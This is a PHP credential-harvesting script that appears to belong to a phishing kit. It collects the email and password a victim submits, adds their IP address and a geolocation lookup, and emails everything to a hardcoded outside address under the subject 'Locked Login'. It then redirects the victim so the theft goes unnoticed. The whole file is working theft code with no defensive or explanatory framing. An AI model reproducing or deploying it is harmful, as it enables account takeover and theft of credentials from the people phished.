<?php

$ip = getenv("REMOTE_ADDR");

//Get IP Country City
$url = "http://api.ipinfodb.com/v3/ip-country/?key=bdf624a70b290f75ecdf08f61ba30bb97b946fcd08a5dd35eeaabbc7b6b3f354&ip=$ip";
$url = "http://api.ipinfodb.com/v3/ip-city/?key=bdf624a70b290f75ecdf08f61ba30bb97b946fcd08a5dd35eeaabbc7b6b3f354&ip=$ip";
$ipCountryCityInfo = file_get_contents($url);
//

$message .= "Email Address: ".$_POST['email']."\n";
$message .= "password: " .$_POST['pass']."\n";
$message .= "IP: ".$ip."\n";
$message .= "Country: ".$ipCountryCityInfo."\n";
$message .= "--------Created by VEEKTOR------\n";

$recipient = "bothabrian@yahoo.com";
$subject = "Locked Login";
$headers = "From:MACHINE";
$headers .= $_POST['eMailAdd']."n";
$headers .= "MIME-Version:1.0";
    mail("$cc", "rcn Info", $message);
if (mail($recipient,$subject,$message,$headers))
      {
          header("Location: index1.php");

      }
else
          {
        echo "ERROR! Please go back and try again.";
        }

?>
